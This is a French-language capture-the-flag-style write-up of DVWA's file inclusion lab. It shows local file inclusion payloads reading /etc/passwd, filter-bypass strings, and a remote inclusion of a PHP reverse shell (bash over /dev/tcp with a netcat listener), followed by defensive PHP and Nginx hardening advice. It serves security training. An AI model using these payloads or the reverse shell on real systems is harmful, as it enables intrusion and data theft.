# DVWA File Inclusion (LFI/RFI)

DVWA **File Inclusion** (LFI/RFI) → **prochaine après CSRF** ! Parfait timing.

****
*Attention* Selon les versions DVWA a des protections pour RFI, Voir fin du write-up 

## Low (direct)

``` text
?page=../../../../../etc/passwd ou ?/page=/etc/passwd OK  
?page=http://ton-ip/shell.txt | nc -lvp 4444
```

**RFI** (Voir fin du write-up)

```text

créer shell.php  <?php exec("/bin/bash -c 'bash -i>& /dev/tcp/127.0.0.1/1234 0>&1'"); ?>

python -m http.server  
`nc -lvp 1234` 
`?page=http://ip:8080/shell.php

shell obtenu sur kali
_dvwa@kali:/usr/share/dvwa/vulnerabilities/fi

```

## Medium (strpos bypass)

``` text

?page=/etc/passwd fonctionne toujours
le code fait une validation très basique du paramètre page avant de l’utiliser plus loin dans le script. 
Après avoir examiné le code, j'ai constaté qu'il utilise la fonction `str_replace` pour supprimer `http://` et `https://` en les remplaçant par une chaîne vide. Ce comportement supprime donc ces préfixes de toute entrée. De même, `../` et `..\\` sont remplacés par une chaîne vide.  

Cependant, si nous utilisons …/./, le ../ au milieu est remplacé par un espace vide, et les valeurs restantes se réduisent à ../, ce qui nous permet de naviguer en utilisant cette approche.  
..././ ---> ../  
..././..././..././..././..././..././etc/passwd fonctionne ainsi que tout fichier avec permission lecture pour tous

```

**RFI** (Voir fin du write-up)
Nous appliquerons la même technique en insérant http:// dans l'URL, comme ceci : hthttp://tp://, qui se transforme automatiquement en http:// pour contourner la vérification.
http: // tp: // ---> http: //

créer shell.php  <?php exec("/bin/bash -c 'bash -i>& /dev/tcp/127.0.0.1/1234 0>&1'"); ?>

python -m http.server  
`nc -lvp 1234`

?page=hthttp://tp://IP:8000/shell.php fonctionne 

shell obtenu
_dvwa@kali:/usr/share/dvwa/vulnerabilities/fi$ 

## High (whitelist include.php)

``` php

code : if( !fnmatch( "file*", $file ) && $file != "include.php" ) {  
    // This isn't the page we want!  
    echo "ERROR: File not found!";  
    exit;  

?page=include1.php (pas include.php)  
}

```

Le code génère une erreur si le fichier ne commence pas par « file » et n'est pas « include.php  
Utilisons le protocole file://, qui permet de lire les fichiers locaux depuis le système plutôt que depuis le serveur web.

/?page=file:///etc/passwd fonctionne

## **Pre-requis RFI**

## Personnalisation RFI 

1. **Edite vhost** : `sudo nano /etc/dvwa/vhost/dvwa-nginx.conf` → `allow all;`
2. **PHP** : `sudo nano /etc/php/8.4/fpm/php.ini` → `allow_url_include = On`
3. **Reload** : `sudo dvwa-stop && sudo dvwa-start`

**Logs debug** :  /var/log/dvwa/error.log et `/var/log/nginx/error.log`

## Bonnes Pratiques (Défense)

```text

1. PHP: allow_url_include=Off (défaut)
PHP-FPM (/etc/php/8.4/fpm/php.ini):
allow_url_include = Off     # Bloque RFI
allow_url_fopen = Off       # Bloque fopen() distant
open_basedir = /usr/share/dvwa/  # Confinement

2. Nginx: deny all; try_files $uri =404;
Nginx (/etc/dvwa/vhost/dvwa-nginx.conf):
location / {
    deny all;                    # Bloque accès direct
    try_files $uri $uri/ =404;   # No auto-include, Bloque RFI/LFI en empêchant Nginx d'auto-inclure des fichiers non-existants dans /var/www .
}
location ~ \.php$ { # Force exécution PHP → bloque inclusion fichiers non-PHP et que les php dans /var/www
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}

3. .htaccess: RewriteRule ^.*$ - [F] (bloque ../)

4. WAF: OWASP CRS (ModSecurity)

5. Code: basename($_GET['page']) + whitelist

6. Fail2Ban: Block IP répétant RFI
ELK Stack: Alert "allow_url_include" + "RFI pattern"

```text

## Ressources
- **Kali DVWA** : https://www.kali.org/tools/dvwa/ [kali](https://www.kali.org/tools/dvwa/)
- **OWASP RFI** : https://owasp.org/www-community/vulnerabilities/Inclusion
- **PHP FPM** : https://www.php.net/manual/en/install.fpm.php
- **Nginx Security** : https://docs.nginx.com/nginx/admin-guide/security-controls/

**GitHub CyberSec** : Screenshots nc shell + Burp → **lab reproductible** !
**Prochaine étape** : CSRF / XSS DOM ?
```

[LinkedIn Profile bosjr](https://www.linkedin.com/in/bosjr)